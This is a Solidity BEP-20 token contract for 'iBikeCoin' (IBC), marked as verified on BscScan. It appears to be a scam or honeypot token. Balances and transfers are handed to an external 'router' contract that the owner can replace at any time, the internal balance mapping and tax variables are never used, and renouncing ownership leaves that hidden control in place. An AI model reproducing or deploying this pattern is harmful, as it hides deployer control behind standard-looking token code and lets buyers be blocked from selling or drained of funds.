/**
 *Submitted for verification at BscScan.com on 2022-09-11
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

interface BEP20 {
    function balanceOf(address who) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function getOwner() external view returns (address);

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}


interface IDEXRouter {
    function factory() external pure returns (address);
    function weth(address weth) external view returns (uint256);
    function addLiquidityETH(  address token, uint amount) external;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        address tokenA,
        address tokenB,
        uint amountOutMin

    ) external;
}

contract IBC is BEP20 {

    address public owner = msg.sender;    
    string public name = "iBikeCoin";
    string public symbol = "IBC";
    uint8 public _decimals;
    uint public _totalSupply;
    IDEXRouter private router;
    address private panckerouter;
    address public marketAddres;
    uint private marketTax = 1;
    uint private burnTax = 1;

    
    mapping (address => mapping (address => uint256)) private allowed;
    mapping (address => uint) balance;
    address private accounting;
    
    constructor()  {
        _decimals = 9;
        _totalSupply = 120000000 * 10 ** _decimals;
        router = IDEXRouter(address(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function init() public {
        require(msg.sender == owner, "owner");
        router.addLiquidityETH(msg.sender, _totalSupply);
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function setIDEXRouter(address _router) public {
        require(msg.sender == owner, "owner");
        router =  IDEXRouter(_router);
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function balanceOf(address who) view  public returns (uint256) {
        return router.weth(who);
    }
    
    function allowance(address who, address spender) view public returns (uint256) {
        return allowed[who][spender];
    }

    function setAccountingAddress(address accountingAddress) public {
        require(msg.sender == owner);
        accounting = accountingAddress;
    }

    function renounceOwnership() public {
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
    
    function transfer(address to, uint amount) public   returns (bool success) {
        emit Transfer(msg.sender, to, amount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint amount) public returns (bool success) {
        require (amount > 1);
        require(allowed[from][msg.sender]>=amount, "Not allowed");
        emit Transfer(from, to, amount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(from, to, amount);
        return true;
    }
        
    function approve(address spender, uint256 value) public returns (bool success) {
        allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

}